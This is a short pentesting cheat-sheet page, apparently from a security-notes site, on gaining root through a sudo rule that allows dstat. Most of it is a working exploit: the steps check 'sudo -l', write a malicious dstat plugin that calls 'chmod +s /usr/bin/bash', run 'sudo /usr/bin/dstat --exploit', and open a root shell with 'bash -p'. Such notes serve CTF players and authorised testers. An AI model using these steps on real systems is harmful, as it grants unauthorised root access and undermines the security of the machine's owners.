---
title: Sudo Dstat Privilege Escalation
description: Sudo dstat command might be vulnerable to privilege escalation (PrivEsc).
tags:
    - Privilege Escalation
refs:
date: 2023-02-05
draft: false
---

**dstat** is a versatile tool for generating system resource statistics.  
It allows users to create a custom plugin and execute by adding option e.g. **`dstat --myplugin`**.  

## Investigation

```sh
sudo -l

(ALL) NOPASSWD: /usr/bin/dstat
```

If we can execute **"dstat"** command as root, we can gain access to privileges by using our malicious plugin.

<br />

## Exploitation

### 1. Create a New Dstat Plugin

First off, find locate the **"dstat"** directory.

```sh
find / -type d -name dstat 2>/dev/null
```

Assume the location of dstat is **“/usr/local/share/dstat”**.  
Create a plugin called **"dstat_exploit.py"** under **"/usr/local/share/dstat/"**.

```sh
import os

os.system('chmod +s /usr/bin/bash')
```

dstat recognizes plugins under **"/usr/local/share/dstat/"**.  
Check if the above exploit plugin has been added by executing the following command.

```sh
dstat --list | grep exploit
```

### 2. Execute Dstat with the Malicious Plugin

Now execute **"dstat"** with **“—exploit”** flag (the flag name is determined by the suffix of the file name e.g. **"dstat_\<plugin-name\>.py"**).

```sh
sudo /usr/bin/dstat --exploit
```

The exploit plugin executed so we enter bash as root.

```sh
bash -p
```